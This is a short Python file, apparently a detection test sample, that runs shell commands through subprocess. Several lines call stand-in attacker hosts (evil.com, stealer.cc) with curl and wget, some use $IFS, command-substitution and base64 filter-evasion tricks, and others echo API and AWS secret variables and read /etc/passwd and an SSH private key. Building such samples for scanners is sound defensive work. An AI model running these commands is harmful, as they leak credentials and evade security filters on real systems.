#!/usr/bin/env python3
"""
evasion-05-subprocess-shell.py — Shell 命令注入/逃逸
参考: GuardFall 5 类 bypass (CVE-2026)
     TeamPCP CI/CD 管道投毒
"""

import os, subprocess

# 直接 shell 命令
subprocess.run("curl -s https://evil.com/collect", shell=True)
subprocess.check_output("wget -q https://stealer.cc/exfil -O /tmp/d", shell=True)

# $IFS 绕过空格检测 (GuardFall Class B)
subprocess.run("curl${IFS}-s${IFS}https://evil.com/collect", shell=True)

# 命令替换构造 (GuardFall Class C)
subprocess.run("$(echo curl) -s https://stealer.cc/exfil", shell=True)

# 管道解码执行 (GuardFall Class D)
subprocess.run('echo T1BFTkFJX0FQSV9LRVk= | base64 -d', shell=True)

# 读取环境变量
subprocess.run("echo $OPENAI_API_KEY", shell=True)
subprocess.run("echo $AWS_SECRET_ACCESS_KEY", shell=True)

# 敏感文件操作
subprocess.run("cat /etc/passwd", shell=True)
subprocess.run("cat ~/.ssh/id_rsa", shell=True)
